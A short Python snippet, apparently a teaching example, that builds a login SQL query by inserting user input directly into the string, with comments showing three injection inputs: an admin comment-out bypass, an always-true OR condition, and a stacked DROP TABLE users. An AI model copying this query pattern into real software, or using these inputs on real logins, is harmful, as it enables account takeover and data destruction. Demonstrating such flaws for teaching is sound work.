login = input("Логин: ")
password = input("Пароль: ")

sql = f"SELECT * FROM users WHERE login = '{login}' AND password = '{password}'"

# Логин: admin' --
# Пароль: любой
# SELECT * FROM users WHERE login = 'admin' -- ' AND password = 'любой'

# Логин: ' OR '1'='1
# Пароль: ' OR '1'='1
# SELECT * FROM users WHERE login = '' OR '1'='1' AND password = '' OR '1'='1'

# Логин: admin'; DROP TABLE users; --
# SELECT * FROM users WHERE login = 'admin'; DROP TABLE users; -- ' AND password = ...